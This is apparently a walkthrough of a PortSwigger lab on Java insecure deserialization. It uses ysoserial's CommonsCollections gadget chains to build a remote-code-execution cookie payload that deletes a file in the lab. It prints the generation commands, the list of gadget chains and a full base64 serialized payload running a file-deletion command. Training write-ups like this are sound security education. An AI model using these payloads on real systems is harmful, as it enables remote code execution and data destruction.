---
title: " PortSwiggerlabs: Exploiting Java deserialization with Apache Commons"
date: 2026-06-29 00:00:00 +0000
categories: [PortSwiggerLabs , Insecure Deserialization ]
tags: [PortSwiggerLabs , Insecure Deserialization , Challenge , Web_Attacks ]
---


## Information : 

This lab uses a serialization-based session mechanism and loads the Apache Commons Collections library. Although you don't have source code access, you can still exploit this lab using pre-built gadget chains.

To solve the lab, use a third-party tool to generate a malicious serialized object containing a remote code execution payload. Then, pass this object into the website to delete the morale.txt file from Carlos's home directory.

You can log in to your own account using the following credentials: wiener:peter


## Solution : 

Now first we login as wiener : 

<img width="1776" height="814" alt="image" src="https://github.com/user-attachments/assets/dea924f7-ec6f-46d6-9483-cbaa065fdf6e" />

Then we check Burp : 

<img width="1898" height="892" alt="image" src="https://github.com/user-attachments/assets/bae8d0d3-f5fb-4d46-b731-3a57c26d232a" />

If we had Burp Pro , it would automatically flag the serialized object , but in our case , i needed to decode it using Inspector , we can see the first magic bytes : 

```java
ac ed \0 05 sr \0
```

ac ed are Magic bytes for Java , every serialized object starts with this , ALWAYS . 

Now for Java , it's different than PHP , we can't just modify the cookie value ourselves and just Base64 and URL encode it after . 

Since it's Java the serialized object is a binary which makes it almost impossible to read , we find some strings we can read but the rest is just gibberish . Moral of the story we need a tool to be able to modify the serialized object for Java : 

Now the tool we're going to use is : ysoserial

```bash
https://github.com/frohoff/ysoserial
```

<img width="1690" height="891" alt="image" src="https://github.com/user-attachments/assets/90246999-00ea-456f-8047-5da7fdb4a274" />

Now since we need to remove the morale.txt file from Carlos's home directory, the command we need is : 

```bash
rm /home/carlos/morale.txt
java -jar ysoserial-all.jar "rm /home/carlos/morale.txt"
```

<img width="1213" height="633" alt="image" src="https://github.com/user-attachments/assets/3ca59b83-8432-4e3a-a8e9-31313d97fb36" />

We still need to provide the payload type which is basically the classes that we can abuse : 

**CommonsCollections = the library that contains the abusable classes**

We can list all of them : 

```bash
Payload             Authors                                Dependencies                                                                                
     -------             -------                                ------------                                                                                
     AspectJWeaver       @Jang                                  aspectjweaver:1.9.2, commons-collections:3.2.2                                              
     BeanShell1          @pwntester, @cschneider4711            bsh:2.0b5                                                                                   
     C3P0                @mbechler                              c3p0:0.9.5.2, mchange-commons-java:0.2.11                                                   
     Click1              @artsploit                             click-nodeps:2.3.0, javax.servlet-api:3.1.0                                                 
     Clojure             @JackOfMostTrades                      clojure:1.8.0                                                                               
     CommonsBeanutils1   @frohoff                               commons-beanutils:1.9.2, commons-collections:3.1, commons-logging:1.2                       
     CommonsCollections1 @frohoff                               commons-collections:3.1                                                                     
     CommonsCollections2 @frohoff                               commons-collections4:4.0                                                                    
     CommonsCollections3 @frohoff                               commons-collections:3.1                                                                     
     CommonsCollections4 @frohoff                               commons-collections4:4.0                                                                    
     CommonsCollections5 @matthias_kaiser, @jasinner            commons-collections:3.1                                                                     
     CommonsCollections6 @matthias_kaiser                       commons-collections:3.1                                                                     
     CommonsCollections7 @scristalli, @hanyrax, @EdoardoVignati commons-collections:3.1                                                                     
     FileUpload1         @mbechler                              commons-fileupload:1.3.1, commons-io:2.4                                                    
     Groovy1             @frohoff                               groovy:2.3.9                                                                                
     Hibernate1          @mbechler                                                                                                                          
     Hibernate2          @mbechler                                                                                                                          
     JBossInterceptors1  @matthias_kaiser                       javassist:3.12.1.GA, jboss-interceptor-core:2.0.0.Final, cdi-api:1.0-SP1, javax.interceptor-api:3.1, jboss-interceptor-spi:2.0.0.Final, slf4j-api:1.7.21
     JRMPClient          @mbechler                                                                                                                          
     JRMPListener        @mbechler                                                                                                                          
     JSON1               @mbechler                              json-lib:jar:jdk15:2.4, spring-aop:4.1.4.RELEASE, aopalliance:1.0, commons-logging:1.2, commons-lang:2.6, ezmorph:1.0.6, commons-beanutils:1.9.2, spring-core:4.1.4.RELEASE, commons-collections:3.1
     JavassistWeld1      @matthias_kaiser                       javassist:3.12.1.GA, weld-core:1.1.33.Final, cdi-api:1.0-SP1, javax.interceptor-api:3.1, jboss-interceptor-spi:2.0.0.Final, slf4j-api:1.7.21
     Jdk7u21             @frohoff                                                                                                                           
     Jython1             @pwntester, @cschneider4711            jython-standalone:2.5.2                                                                     
     MozillaRhino1       @matthias_kaiser                       js:1.7R2                                                                                    
     MozillaRhino2       @_tint0                                js:1.7R2                                                                                    
     Myfaces1            @mbechler                                                                                                                          
     Myfaces2            @mbechler                                                                                                                          
     ROME                @mbechler                              rome:1.0                                                                                    
     Spring1             @frohoff                               spring-core:4.1.4.RELEASE, spring-beans:4.1.4.RELEASE                                       
     Spring2             @mbechler                              spring-core:4.1.4.RELEASE, spring-aop:4.1.4.RELEASE, aopalliance:1.0, commons-logging:1.2   
     URLDNS              @gebl                                                                                                                              
     Vaadin1             @kai_ullrich                           vaadin-server:7.7.14, vaadin-shared:7.7.14                                                  
     Wicket1             @jacob-baines                          wicket-util:6.23.0, slf4j-api:1.6.4
```

Let's try the CommonCollections : 

If you're using a recent Java version , you should get an error since ysoserial won't be able to access internal classes . 

<img width="1895" height="607" alt="image" src="https://github.com/user-attachments/assets/a3d3cb86-250b-4c94-8b35-c95c3ee9b173" />

A way around this is either use --add-opens which will manually open specific module/packages so that external code can access it , or simply install Java 8 and use it instead : 

```bash
wget https://github.com/adoptium/temurin8-binaries/releases/download/jdk8u392-b08/OpenJDK8U-jdk_x64_linux_hotspot_8u392b08.tar.gz
tar -xzf OpenJDK8U-jdk_x64_linux_hotspot_8u392b08.tar.gz
./jdk8u392-b08/bin/java -jar ysoserial-all.jar CommonsCollections6 'rm /home/carlos/morale.txt' | base64 -w 0
```

<img width="1899" height="611" alt="image" src="https://github.com/user-attachments/assets/5e5b57c1-4ebc-4760-9eee-35c2afd1aba4" />

Perfect , now we've got our paylaod : 

```bash
rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldLpEhZWWuLc0AwAAeHB3DAAAAAI/QAAAAAAAAXNyADRvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMua2V5dmFsdWUuVGllZE1hcEVudHJ5iq3SmznBH9sCAAJMAANrZXl0ABJMamF2YS9sYW5nL09iamVjdDtMAANtYXB0AA9MamF2YS91dGlsL01hcDt4cHQAA2Zvb3NyACpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMubWFwLkxhenlNYXBu5ZSCnnkQlAMAAUwAB2ZhY3Rvcnl0ACxMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwc3IAOm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5DaGFpbmVkVHJhbnNmb3JtZXIwx5fsKHqXBAIAAVsADWlUcmFuc2Zvcm1lcnN0AC1bTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHVyAC1bTG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5UcmFuc2Zvcm1lcju9Virx2DQYmQIAAHhwAAAABXNyADtvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ29uc3RhbnRUcmFuc2Zvcm1lclh2kBFBArGUAgABTAAJaUNvbnN0YW50cQB+AAN4cHZyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAAAAAAeHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkludm9rZXJUcmFuc2Zvcm1lcofo/2t7fM44AgADWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7TAALaU1ldGhvZE5hbWV0ABJMamF2YS9sYW5nL1N0cmluZztbAAtpUGFyYW1UeXBlc3QAEltMamF2YS9sYW5nL0NsYXNzO3hwdXIAE1tMamF2YS5sYW5nLk9iamVjdDuQzlifEHMpbAIAAHhwAAAAAnQACmdldFJ1bnRpbWV1cgASW0xqYXZhLmxhbmcuQ2xhc3M7qxbXrsvNWpkCAAB4cAAAAAB0AAlnZXRNZXRob2R1cQB+ABsAAAACdnIAEGphdmEubGFuZy5TdHJpbmeg8KQ4ejuzQgIAAHhwdnEAfgAbc3EAfgATdXEAfgAYAAAAAnB1cQB+ABgAAAAAdAAGaW52b2tldXEAfgAbAAAAAnZyABBqYXZhLmxhbmcuT2JqZWN0AAAAAAAAAAAAAAB4cHZxAH4AGHNxAH4AE3VyABNbTGphdmEubGFuZy5TdHJpbmc7rdJW5+kde0cCAAB4cAAAAAF0ABpybSAvaG9tZS9jYXJsb3MvbW9yYWxlLnR4dHQABGV4ZWN1cQB+ABsAAAABcQB+ACBzcQB+AA9zcgARamF2YS5sYW5nLkludGVnZXIS4qCk94GHOAIAAUkABXZhbHVleHIAEGphdmEubGFuZy5OdW1iZXKGrJUdC5TgiwIAAHhwAAAAAXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAB3CAAAABAAAAAAeHh4
```

Now back to Repeater : 

<img width="1895" height="678" alt="image" src="https://github.com/user-attachments/assets/f36111d2-e63c-40a3-b4b6-3d0746f830d7" />

We just modify the Cookie : 

<img width="1552" height="757" alt="image" src="https://github.com/user-attachments/assets/f575f055-cd80-4eed-a332-0e76f17f15c3" />

We should always URL encode everything before sending the request since serialized objects are expected to be URL encoded : 

<img width="1537" height="781" alt="image" src="https://github.com/user-attachments/assets/5d5a9889-5d58-4bdb-b7d4-e5f092b68759" />

CommonsCollections6 targets commons-collections 3.x but the server has commons-collections 4.x installed, which has different package names → ClassNotFoundException. We try other gadget chains that target the correct version until one matches what's actually installed on the server

In other words : 

Between version 3 and 4, Apache Commons Collections changed their package name, so the classes are at a different path, CC6 looks for the version 3 path but the server only has version 4 installed, so it can't find it → ClassNotFoundException

Now we just try different collections : 

```bash
./jdk8u392-b08/bin/java -jar ysoserial-all.jar CommonsCollections4 'rm /home/carlos/morale.txt' | base64 -w 0
```

<img width="1663" height="782" alt="image" src="https://github.com/user-attachments/assets/d9889bed-5399-4e14-9dcd-c8dc34366bb7" />

Now we just replace the cookie with this value , and make sure you URL encode it before sending it : 

<img width="1852" height="825" alt="image" src="https://github.com/user-attachments/assets/ff062ffc-8a97-4849-aa28-e9acf977ae91" />

Perfect we were able to delete the file , and solve our lab . 

That was all for this lab , see you in the next one :) 
